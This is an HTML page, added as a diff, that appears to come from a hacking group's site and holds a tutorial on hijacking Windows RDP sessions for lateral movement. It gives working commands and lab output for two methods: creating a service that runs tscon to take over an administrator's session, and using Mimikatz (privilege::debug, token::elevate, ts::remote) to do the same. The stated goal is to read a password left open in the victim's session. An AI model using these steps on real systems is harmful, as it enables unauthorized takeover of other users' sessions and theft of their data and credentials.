@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+    <title>Paper: Lateral Movement via RDP Hijacking - Amolo</title>
+
+    <style>
+    @font-face {
+        font-family: 'EnglishTowne';
+        src: url('../../../fonts/EnglishTowne.ttf') format('truetype');
+    }
+
+    body {
+        background-image: url('../../../imgs/bg.png');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-attachment: fixed;
+        margin: 0;
+        padding: 0;
+    }
+
+    .ascii {
+        color: white;
+        padding: 30px;
+        text-align: center;
+        font-family: 'EnglishTowne', cursive;
+        font-size: 90px;
+    }
+
+    .nav {
+        display: flex;
+        justify-content: center;
+        background-color: rgba(5, 5, 5, 0.8);
+        gap: 10px;
+        padding: 10px 0;
+    }
+
+    .nav a {
+        color: white;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-family: monospace;
+    }
+
+    .nav a:hover {
+        background-color: rgb(38, 7, 112);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .nav a.active {
+        background-color: rgb(71, 37, 153);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .card {
+        color: #000;
+        background-color: #aaa;
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .pre-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    pre {
+		background-color: #1e1e1e40;
+		color: white;
+		padding: 20px 30px;
+		border-radius: 10px;
+		box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+		width: 90%;
+		max-width: 1200px;
+		margin: 0 auto;
+		overflow-x: auto;
+		white-space: pre-wrap;
+		font-family: monospace;
+
+		border: 2px solid rgba(255, 255, 255, 0.75);
+		box-sizing: border-box;
+
+		text-indent: 0;
+		word-break: break-word;
+	}
+    </style>
+</head>
+
+<body>
+    <div class="nav">
+        <a href="../../index.html">❮─❲Home❳─❯</a>
+        <a href="../../papers/" class="active">❮─❲✧Papers✧❳─❯</a>
+        <a href="../../members/">❮─❲Members❳─❯</a>
+    </div>
+
+    <div class="ascii">
+        Amolo ☽
+    </div>
+
+    <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">
+        Lateral Movement via RDP Hijacking
+    </h1>
+    <p style="line-height: normal; margin:unset; padding:unset; margin-bottom: 20px; font-family:monospace; text-align:center; color:white;">
+		Author: @br0sck
+	</p>
+
+    <div class="pre-container">
+        <pre>
+⠀⠀⠀⣤⣴⣾⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄
+⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢰⣦⣄⣀⣀⣠⣴⣾⣿⠃
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⠀⠀⣼⣿⡿⠿⠛⠻⠿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
+⠀⠀⠉⠀⠀⠀⢀⠀⠀⠀⠈⠁⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
+⠀⠀⣠⣴⣶⣿⣿⣿⣷⣶⣤⠀⠀⠀⠈⠉⠛⠛⠛⠉⠉⠀⠀⠀
+⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣦⣄⣀⣀⣀⣤⣤⣶⠀⠀
+⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+⢠⣿⡿⠿⠛⠉⠉⠉⠛⠿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
+⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠿⠛⠀⠀⠀
+
+
+
+	▓▓▓▓▓▓        ▓▓▓▓▓▓      ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓    ▓▓▓▓    
+  ▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓  
+  ▓▓▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒          ▒▒▒▒▒▒▒▒▒▒▓▓  
+  ▓▓▒▒                           Summary                      ▒▒▓▓  
+  ▓▓▒▒                                                        ▒▒▓▓  
+    ▓▓▒▒                1. What is RDP Hijacking              ▒▒▓▓▓▓
+    ▓▓▒▒                                                      ▒▒▓▓▓▓
+    ▓▓▒▒                                                      ▒▒▓▓  
+  ▓▓▓▓▒▒                                                      ▒▒▓▓  
+  ▓▓▒▒                      2. Requirements                   ▒▒▓▓▓▓
+  ▓▓▒▒                                                          ▒▒▓▓
+  ▓▓▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒           3. Hijacking using Command Prompt          ▒▒▓▓▓▓
+    ▓▓▒▒                                                      ▒▒▓▓  
+    ▓▓▓▓▒▒                                                    ▒▒▓▓  
+    ▓▓▒▒                                                      ▒▒▓▓  
+    ▓▓▓▓▒▒            4. Hijacking using Mimikatz             ▒▒▓▓▓▓
+    ▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒               ████████       ████                      ▒▒▓▓
+    ▓▓▒▒            ██████             █████████                ▒▒▓▓
+    ▓▓▒▒                                                      ▒▒▓▓▓▓
+    ▓▓▒▒              ████████              ██    ██████      ▒▒▒▒  
+    ▓▓▒▒        ████████    ██████████      ████████  ████    ▒▒▒▒  
+  ▓▓▓▓▒▒                      ████                            ▒▒▒▒  
+  ▓▓▒▒                                                        ▒▒▓▓  
+  ▓▓▓▓▒▒        ██        ██                          ████    ▒▒▓▓▓▓
+    ▓▓▒▒        ██████  ████████  ████    ████████████  ██      ▒▒▓▓
+    ▓▓▒▒            ██████    ██████                            ▒▒▓▓
+  ▓▓▓▓▒▒                                                        ▒▒▓▓
+  ▓▓▓▓▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▓▓
+    ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓  
+        ▓▓▓▓▓▓        ▓▓▓▓▓▓    ▓▓▓▓▓▓      ▓▓▓▓      ▓▓▓▓▓▓▓▓▓▓  
+
+
+In this paper, I will cover 2 ways to perform a Remote Desktop Protocol hijacking.
+
+╔══════════════════════════════════════╗
+║         What is an RDP Hijack        ║
+╚══════════════════════════════════════╝
+
+RDP hijacking is one of the essential post-exploitation techniques in Windows environments. With this technique, it is possible to gain remote access to a user's desktop to access data that is present in the user's session.
+
+The example scenario we will use will have an active RDP session of the Administrator user, where there is a password written in a notepad. The objective is to hijack the Administrator user's session to gain access to the notepad where the password is.
+
+╔═════════════════════╗
+║     Requirements    ║
+╚═════════════════════╝
+
+For the attack to work properly, all of these requirements must be met:
+* User account with administrative access
+* Access to the machine via RDP
+* Mimikatz deployed on the machine
+
+╔════════════════════════════════════════╗
+║     Hijacking Using Command Prompt     ║
+╚════════════════════════════════════════╝
+
+Hijacking an RDP session using the Command Prompt involves creating a service that will run cmd.exe and calling the executable "tscon.exe" to jump to another session. If you try to run tscon without using a service account, the program returns a message asking the user to enter the password for the account you want to hijack.
+
+A command prompt or powershell run as an administrator is not enough; you need to run the attack with an account with permissions above the administrators group. The "Local Service" account is above the administrators; if you run tscon with this user, you will not need to authenticate with the target user's account.
+
+Let's get started!
+Run cmd.exe as an administrator and execute the following command:
+
+╔════════════════════════════════════════════════════════════════════════════════════╗
+║Microsoft Windows [Version 10.0.20348.587]                                          ║
+║(c) Microsoft Corporation. All rights reserved.                                     ║
+║                                                                                    ║
+║C:\Windows\system32>query user                                                      ║
+║ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME         ║
+║ administrator         rdp-tcp#0           2  Active          .  06/05/2023 10:18   ║
+║>rdpuser               rdp-tcp#1           3  Active          .  06/05/2023 10:18   ║
+╚════════════════════════════════════════════════════════════════════════════════════╝
+
+With this command, you can see all active RDP sessions on the machine. The user used is "rdpuser", who will be responsible for hijacking the RDP session of the "administrator" user.
+
+With this in mind, create a service via cmd with the following command:
+
+sc create rdphijacking binpath="cmd.exe /k tscon ID /dest:SESSIONNAME"
+
+Change the "ID" to the ID of the session you want to hijack, which in this case is ID 2. Also change the "SESSIONNAME" to your RDP session name, which in this case is rdp-tcp#1.
+
+╔════════════════════════════════════════════════════════════════════════════════════════╗
+║Microsoft Windows [Version 10.0.20348.587]                                              ║
+║(c) Microsoft Corporation. All rights reserved.                                         ║
+║                                                                                        ║
+║C:\Windows\system32>query user                                                          ║
+║ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME             ║
+║ administrator         rdp-tcp#0           2  Active          .  06/05/2023 10:18       ║
+║>rdpuser               rdp-tcp#1           3  Active          .  06/05/2023 10:18       ║
+║                                                                                        ║
+║C:\Windows\system32>sc create rdphijacking binpath="cmd.exe /k tscon 2 /dest:rdp-tcp#1" ║
+║[SC] CreateService SUCCESS                                                              ║ 
+║                                                                                        ║
+╚════════════════════════════════════════════════════════════════════════════════════════╝
+
+The service has been created, now just run the command "net start rdphijacking".
+
+After execution, your session will be quickly switched to the RDP session you hijacked. If you want to delete the service, run the command "sc delete rdphijacking".
+
+╔═════════════════════════════════╗
+║     Hijacking using Mimikatz    ║
+╚═════════════════════════════════╝
+
+The Mimikatz tool contains RDP-related functionality that helps with lateral movement. Install Mimikatz on the target machine and run the following commands in cmd as administrator:
+
+╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║C:\Users\rdpuser\Desktop\mimikatz-master\x64>mimikatz.exe                                                                                    ║
+║                                                                                                                                             ║
+║  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36                                                                                 ║
+║ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                  ║
+║ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                     ║
+║ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                       ║
+║ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                    ║
+║  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                    ║
+║                                                                                                                                             ║
+║mimikatz # privilege::debug                                                                                                                  ║
+║Privilege '20' OK                                                                                                                            ║
+║                                                                                                                                             ║
+║mimikatz # token::elevate                                                                                                                    ║
+║Token Id  : 0                                                                                                                                ║
+║User name :                                                                                                                                  ║
+║SID name  : NT AUTHORITY\SYSTEM                                                                                                              ║
+║                                                                                                                                             ║
+║560     {0;000003e7} 1 D 20777          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                                      ║
+║-> Impersonated !                                                                                                                            ║
+║* Process Token : {0;00083144} 3 F 2696845     ADLAB\rdpuser   S-1-5-21-1925757665-3945186109-1063137025-1104  (14g,26p)       Primary       ║
+║* Thread Token  : {0;000003e7} 1 D 2773832     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)            ║
+║                                                                                                                                             ║
+║mimikatz # ts::sessions                                                                                                                      ║
+║                                                                                                                                             ║
+║Session: 0 - Services                                                                                                                        ║
+║state: Disconnected (4)                                                                                                                      ║
+║user :  @                                                                                                                                    ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║                                                                                                                                             ║
+║Session: 1 - Console                                                                                                                         ║
+║state: Connected (1)                                                                                                                         ║
+║user :  @                                                                                                                                    ║
+║Conn : 06/05/2023 10:17:21                                                                                                                   ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║                                                                                                                                             ║
+║Session: 2 - RDP-Tcp#0                                                                                                                       ║
+║state: Active (0)                                                                                                                            ║
+║user : Administrator @ ADLAB                                                                                                                 ║
+║Conn : 06/05/2023 10:18:39                                                                                                                   ║
+║logon: 06/05/2023 10:18:40                                                                                                                   ║
+║last : 06/05/2023 10:59:05                                                                                                                   ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║addr4: 10.18.1.10                                                                                                                            ║
+║                                                                                                                                             ║
+║Session: *3 - RDP-Tcp#1                                                                                                                      ║
+║state: Active (0)                                                                                                                            ║
+║user : rdpuser @ ADLAB                                                                                                                       ║
+║Conn : 06/05/2023 10:18:53                                                                                                                   ║
+║logon: 06/05/2023 10:18:55                                                                                                                   ║
+║last : 06/05/2023 11:00:24                                                                                                                   ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║addr4: 10.18.1.12                                                                                                                            ║
+║                                                                                                                                             ║
+║Session: 65536 - RDP-Tcp                                                                                                                     ║
+║state: Listen (6)                                                                                                                            ║
+║user :  @                                                                                                                                    ║
+║lock : no                                                                                                                                    ║
+║                                                                                                                                             ║
+║mimikatz # ts::remote /id:2                                                                                                                  ║
+╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+Note that the "id" parameter is numbered 2, which is the session ID of the Administrator user.
+
+When you run the commands, you will be redirected to the user's session.
+
+
+                        _--_
+                       /   -)
+                   ___/___|___
+      ____-----=~~///|     ||||~~~==-----_____
+    //~////////////~/|     |//|||||\\\\\\\\\\\\\
+   ///////////////////|   |///////|\\\\\\\\\\\\\\\
+ /////~~~~~~~~~~~~~~~\ |.||/~~~~~~~~~~~~~~~~~`\\\\\
+//~                  /\\|\\                      ~\\
+                    ///W^\W\
+                   ////|||\\\
+                   ~~~~~~~~~~
+
+Thanks for reading my paper, see you next time ;)
+                </pre>                    
+        </div>
+    </body>
+</html>
